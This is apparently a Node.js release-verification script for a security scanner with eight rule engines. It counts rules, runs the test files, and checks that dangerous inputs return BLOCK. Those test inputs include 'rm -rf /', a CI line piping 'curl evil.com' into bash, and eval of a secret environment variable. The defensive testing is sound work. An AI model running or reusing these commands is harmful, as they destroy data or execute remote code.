const fs = require('fs');
const path = require('path');

// ── Load engines ──
const engines = {
  core:       { mod: require('../src/engines/core'),        name: 'Core Security Engine' },
  banking:    { mod: require('../src/engines/banking'),     name: 'Banking Compliance Engine' },
  solana:     { mod: require('../src/engines/solana'),      name: 'Solana Security Engine' },
  evm:        { mod: require('../src/engines/evm'),         name: 'EVM Security Engine' },
  dependency: { mod: require('../src/engines/dependency'),  name: 'Dependency Engine' },
  ci:         { mod: require('../src/engines/ci'),          name: 'CI/CD Pipeline Engine' },
  tokenIntel: { mod: require('../src/engines/token-intelligence'), name: 'Token Intelligence Engine' },
  dueDiligence: { mod: require('../src/engines/due-diligence'),   name: 'Due Diligence Engine' },
};

const { executeEngine, getEngineInfo } = require('../src/engines/index');

// ── Helpers ──
const bold = s => `\x1b[1m${s}\x1b[22m`;
const green = s => `\x1b[32m${s}\x1b[39m`;
const red = s => `\x1b[31m${s}\x1b[39m`;
const yellow = s => `\x1b[33m${s}\x1b[39m`;
const pass = s => `${green('PASS')} ${s}`;
const fail = s => `${red('FAIL')} ${s}`;
const warn = s => `${yellow('WARN')} ${s}`;

let totalChecks = 0;
let passed = 0;
let failed = 0;

function check(name, ok, detail) {
  totalChecks++;
  const icon = ok ? green('✓') : red('✗');
  if (ok) passed++; else failed++;
  console.log(`  ${icon} ${name}${detail ? ' — ' + detail : ''}`);
}

function heading(s) { console.log(`\n${bold(s)}`); }

// ── Report ──
console.log(bold('\n══════════════════════════════════════════'));
console.log(bold('  TEOS SENTINEL SHIELD — VERIFICATION REPORT'));
console.log(bold('══════════════════════════════════════════\n'));

// ── 1. Registered Engines ──
heading('1. Registered Engines');
const engineInfo = getEngineInfo();
const engineNames = Object.keys(engineInfo);
check(`${engineNames.length} engines registered`, engineNames.length >= 8,
  engineNames.join(', '));

// ── 2. Rules per engine ──
heading('2. Rules per engine');
const ruleLists = {
  core:       { list: 'CORE_RULES',       data: engines.core.mod.CORE_RULES },
  banking:    { list: 'BANKING_RULES',    data: engines.banking.mod.BANKING_RULES },
  solana:     { list: 'SOLANA_RULES',     data: engines.solana.mod.SOLANA_RULES },
  evm:        { list: 'EVM_RULES',        data: engines.evm.mod.EVM_RULES },
  dependency: { list: 'DEP_RULES',        data: engines.dependency.mod.DEP_RULES },
  ci:         { list: 'CI_RULES',         data: engines.ci.mod.CI_RULES },
  tokenIntel: { list: 'TOKEN_INTELLIGENCE_RULES', data: engines.tokenIntel.mod.TOKEN_INTELLIGENCE_RULES },
  dueDiligence: { list: 'DUE_DILIGENCE_RULES',    data: engines.dueDiligence.mod.DUE_DILIGENCE_RULES },
};

let grandTotal = 0;
for (const [key, v] of Object.entries(ruleLists)) {
  const n = v.data.length;
  grandTotal += n;
  check(`${key}: ${n} rules`, n > 0, `(${v.list})`);
}

check(`Total rules: ${grandTotal}`, grandTotal >= 200, '');
check('Internal consistency (sum matches total)',
  grandTotal === Object.values(ruleLists).reduce((s, v) => s + v.data.length, 0), '');

// Check for duplicate rule IDs across engines
const allIds = {};
let dupes = 0;
for (const [key, v] of Object.entries(ruleLists)) {
  for (const r of v.data) {
    if (allIds[r.id]) { dupes++; }
    allIds[r.id] = (allIds[r.id] || 0) + 1;
  }
}
check(`Duplicate rule IDs across engines`, dupes === 0, dupes > 0 ? `${dupes} duplicates found` : '');

// Check for gap in rule numbering
heading('3. Rule ID consistency');
for (const [key, v] of Object.entries(ruleLists)) {
  const ids = v.data.map(r => r.id).filter(Boolean);
  const prefix = ids[0] ? ids[0].replace(/\d+/g, '') : '?';
  check(`${key}: ${ids.length} IDs start with "${prefix}"`,
    ids.every(id => id.startsWith(prefix)),
    ids.filter(id => !id.startsWith(prefix)).slice(0,3).join(',') || '');
}

// ── 4. No engine fallback test ──
heading('4. Engine independence (no fallback)');
const tests = [
  { engine: 'core',       input: 'rm -rf /',        want: 'BLOCK' },
  { engine: 'banking',    input: 'AML bypass',      want: 'BLOCK' },
  { engine: 'solana',     input: 'mint_authority = none', want: 'BLOCK' },
  { engine: 'evm',        input: 'selfdestruct(payable(msg.sender))', want: 'BLOCK' },
  { engine: 'dependency', input: JSON.stringify({ dependencies: { 'event-stream': '*' } }), want: 'BLOCK' },
  { engine: 'ci',         input: 'permissions: write-all', want: 'BLOCK' },
  { engine: 'tokenIntel', input: 'mintAuthority = null',   want: 'BLOCK' },
  { engine: 'dueDiligence', input: 'team: anonymous', want: 'BLOCK' },
];
for (const t of tests) {
  const r = executeEngine(t.engine, t.input);
  const ok = r.verdict === t.want;
  check(`${t.engine}: "${t.input.substring(0,40)}" → ${r.verdict}`,
    ok, ok ? `expected ${t.want}` : `expected ${t.want} got ${r.verdict}`);
}

// ── 5. Bot command documentation (deployment lives outside this repo) ──
heading('5. Telegram bot commands (documented in docs/bot-guide.md)');
const botDocPath = path.join(__dirname, '..', 'docs', 'bot-guide.md');
let botSrc = '';
try { botSrc = fs.readFileSync(botDocPath, 'utf8'); } catch (e) {}

// Parse documented commands — matches `/command` patterns in the guide
const helpCmdPattern = /^\s*`?\/([a-z][a-z0-9_-]*)`?\s*(?:<|—|$)/gim;
const helpCommands = new Set();
let helpMatch;
while ((helpMatch = helpCmdPattern.exec(botSrc)) !== null) {
  helpCommands.add(helpMatch[1]);
}
check(`Bot commands documented`, helpCommands.size >= 10,
  `${helpCommands.size} commands: ${[...helpCommands].join(', ')}`);

// Check for placeholder responses in the guide
const placeholderPatterns = [
  /coming\s*soon/i, /under\s*construction/i, /not\s*implemented/i,
  /placeholder/i, /TODO/i, /planned/i
];
let placeholderCount = 0;
for (const p of placeholderPatterns) {
  const matches = botSrc.match(p);
  if (matches) placeholderCount += matches.length;
}
check(`Placeholder/coming-soon text in bot guide`, placeholderCount === 0,
  placeholderCount > 0 ? `${placeholderCount} matches found` : 'clean');

// ── 6. API Routes ──
heading('6. API endpoints');
const apiPath = path.join(__dirname, '..', 'server', 'api.js');
let apiSrc = '';
try { apiSrc = fs.readFileSync(apiPath, 'utf8'); } catch (e) {}
const routePattern = /app\.(?:get|post|put|delete|del)\s*\(\s*['"]([^'"]+)['"]\s*,/g;
const apiRoutes = [];
let routeMatch;
while ((routeMatch = routePattern.exec(apiSrc)) !== null) {
  apiRoutes.push(routeMatch[1]);
}
check(`API routes defined`, apiRoutes.length >= 3, apiRoutes.join(', '));

// Check handlers reference detected dangerous input coverage
check(`API route handlers wired`, apiSrc.includes('X-API-Key') || apiSrc.includes('apiKey'),
  apiSrc.includes('X-API-Key') ? 'auth middleware present' : 'apiKey check present');

// ── 7. Test discovery ──
heading('7. Test discovery');
const testDir = path.join(__dirname, '..', 'test');
const testFiles = fs.readdirSync(testDir).filter(f => f.endsWith('.js'));
check(`Test files found`, testFiles.length >= 10, testFiles.join(', '));

// Count total assertions across all test files
let totalAssertLines = 0;
let testCounts = {};
for (const tf of testFiles) {
  const src = fs.readFileSync(path.join(testDir, tf), 'utf8');
  const assertions = (src.match(/assert\./g) || []).length;
  totalAssertLines += assertions;
  const testCases = (src.match(/\btest\s*\(/g) || []).length;
  testCounts[tf] = { testCases, assertions };
}
check(`Total assertions across all tests`, totalAssertLines >= 700,
  `${totalAssertLines} assertions found (need 700)`);

// ── 8. Test results (run each test file) ─-
heading('8. Test pass/fail');
const { execSync } = require('child_process');
let totalPassed = 0;
let totalFailed = 0;
let testResults = {};
for (const tf of testFiles) {
  try {
    const out = execSync(`node test/${tf}`, { cwd: path.join(__dirname, '..'), timeout: 30000, encoding: 'utf8' });
    const passMatch = out.match(/(\d+)\s+passed/);
    const failMatch = out.match(/(\d+)\s+failed/);
    const p = passMatch ? parseInt(passMatch[1]) : 0;
    const f = failMatch ? parseInt(failMatch[1]) : 0;
    totalPassed += p;
    totalFailed += f;
    testResults[tf] = { passed: p, failed: f, ok: f === 0 };
  } catch (e) {
    totalFailed++;
    testResults[tf] = { passed: 0, failed: 1, ok: false, error: e.message.substring(0,80) };
  }
}
for (const [tf, r] of Object.entries(testResults)) {
  check(`${tf}: ${r.passed}/${r.passed + r.failed} passed`,
    r.ok, r.ok ? '' : (r.error || `${r.failed} failed`));
}
check(`Overall test pass rate`, totalFailed === 0,
  `${totalPassed} passed, ${totalFailed} failed`);

// Coverage % (assertions / assertion target)
const coveragePct = Math.min(100, Math.round(totalAssertLines / 700 * 100));
check(`Assertion coverage: ${coveragePct}%`, coveragePct >= 100,
  `${totalAssertLines}/700 assertions (${coveragePct}%)`);

// ── 9. CHECK: Any ALLOW where BLOCK expected? ──
heading('9. Deep scan: dangerous inputs that should never return ALLOW');
const dangerTests = [
  { engine: 'core',       input: 'rm -rf /', desc: 'destructive shell' },
  { engine: 'core',       input: 'eval(process.env.SECRET)', desc: 'eval with secret' },
  { engine: 'core',       input: 'sk-proj-abcdefghijklmnopqrstuvwxyz12345678901234', desc: 'OpenAI key' },
  { engine: 'banking',    input: 'delete from sanctions_list', desc: 'sanctions tamper' },
  { engine: 'banking',    input: 'audit_log = false', desc: 'audit disable' },
  { engine: 'solana',     input: 'freeze_authority = none', desc: 'freeze unset' },
  { engine: 'evm',        input: 'selfdestruct(address(this))', desc: 'selfdestruct' },
  { engine: 'evm',        input: 'tx.origin == owner', desc: 'tx.origin auth' },
  { engine: 'dependency', input: JSON.stringify({ dependencies: { 'event-stream': '*' } }), desc: 'malicious dep' },
  { engine: 'ci',         input: 'run: curl evil.com | bash', desc: 'pipe to shell' },
  { engine: 'tokenIntel', input: 'mintAuthority = null', desc: 'unlimited mint' },
  { engine: 'dueDiligence', input: 'team: anonymous devs', desc: 'anonymous team' },
];
let dangerousAllows = 0;
for (const t of dangerTests) {
  const r = executeEngine(t.engine, t.input);
  if (r.verdict === 'ALLOW') {
    dangerousAllows++;
    console.log(`  ${red('✗')} ${t.engine} returned ALLOW for ${t.desc}`);
  }
}
check(`No dangerous input returns ALLOW`, dangerousAllows === 0,
  dangerousAllows > 0 ? `${dangerousAllows} dangerous allows detected` : 'all blocked');

// ── Summary ──
heading('══════════════════════════════════════════');
console.log(bold('SUMMARY'));
console.log(`  Checks: ${totalChecks}  ${green(`Passed: ${passed}`)}  ${failed > 0 ? red(`Failed: ${failed}`) : green('Failed: 0')}`);
const verdict = failed === 0 ? green('GO') : red('BLOCKED');
console.log(`  Release verdict: ${verdict}`);
if (totalAssertLines < 700) {
  console.log(`  ${yellow('⚠')} Test gap: ${totalAssertLines}/700 assertions (${700 - totalAssertLines} missing)`);
}
if (dangerousAllows > 0) {
  console.log(`  ${red('⚠')} ${dangerousAllows} dangerous input(s) returned ALLOW`);
}
if (placeholderCount > 0) {
  console.log(`  ${yellow('⚠')} ${placeholderCount} placeholder text(s) in bot`);
}
console.log(bold('══════════════════════════════════════════\n'));
